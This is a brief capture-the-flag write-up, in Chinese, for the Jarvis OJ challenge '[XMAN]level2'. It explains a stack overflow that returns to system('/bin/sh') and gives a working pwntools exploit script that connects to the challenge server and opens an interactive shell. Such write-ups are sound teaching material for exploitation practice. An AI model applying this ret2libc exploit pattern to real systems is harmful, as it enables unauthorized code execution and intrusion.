# write up 0711

## [XMAN]level2

### 分析：

程序中有/bin/sh字符串和system函数，通过栈溢出返回到构造的shellcode

exp:

```python
from pwn import *

#n = process('./level2')
n = remote('pwn2.jarvisoj.com', 9878)

elf = ELF('./level2')

offset = 0x88 + 4

sh_addr = next(elf.search('/bin/sh'))
sys_addr = elf.symbols["system"]

payload = 'a' * offset + p32(sys_addr) + p32(1) + p32(sh_addr)
n.recv()
n.sendline(payload)
n.interactive()
```


